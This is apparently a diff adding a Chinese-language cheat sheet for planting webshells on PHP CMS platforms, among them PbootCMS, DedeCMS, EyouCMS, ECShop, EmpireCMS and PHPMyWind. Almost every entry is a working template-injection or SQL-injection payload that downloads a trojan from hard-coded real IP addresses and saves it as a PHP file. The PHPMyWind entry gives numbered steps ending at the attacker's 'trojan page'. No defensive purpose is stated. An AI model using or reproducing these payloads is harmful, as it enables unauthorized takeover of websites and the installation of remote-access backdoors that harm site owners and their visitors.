@@ -1,0 +1,43 @@
+pbootget拿shell   
+基础内容
+站点信息
+</title><?php file_put_contents('data.php', file_get_contents('http://216.83.53.42/qingwa.txt')); ?><title>
+清理缓存
+全局配置
+配置参数
+动态缓存启用
+标题样式
+{pboot:sitestatistical}
+清理缓存
+打开无痕域名后缀加data.php或者服务器  进主页 然后进码
+
+dede拿shell
+tag_test_action.php?url=a&token=&partcode={dede:field name='source' runphp='yes'}copy("http://216.83.53.42/qingwa.txt","indexl.php");{/dede:field}
+
+eyou拿shell
+{$a="copy"}
+{$a("http://216.83.53.42/qingwa.txt","data.php")}
+
+echop拿shell
+http://27.124.6.119/11.php
+
+ecms拿shell
+系统-数据表模型-管理数据表-导入-成功-输入后缀x.php
+
+<?php
+
+
+file_put_contents('dd.rar',file_get_contents('http://216.83.53.42/dll/1.txt'));
+file_put_contents('x.php',file_get_contents('http://216.83.53.42/dll/3.txt'));
+
+?>
+（MOD)文件
+
+phpMywind拿shell
+1、进入后台：点击网站系统管理->>>>数据库管理
+2、点击执行sql，将下面sql放入执行框（可更换木马下载地址），点击执行
+insert into pmw_webconfig(varname, varvalue, vartype) values('test', 'file_put_contents("zz.php", \'<?php $a = "copy";$a("http://27.124.6.119/11.txt","d.php");?>\')', 'number')
+3、执行完毕后，点击网站系统管理->>>>站点配置管理-》添加新站点（内容随便输入）
+4、浏览器访问http://地址/admin/zz.php(zz.php在sql里面可以更换)
+5，第4步骤运行完毕后，浏览器浏览 http://地址/admin/d.php（进入咱们的木马页）
+备注：如果没有成功，再次操作2、3步骤，需要更换sql里面的varname 和要上传的文件名（例如文档里：test改为test1 zz.php改为aa.php）
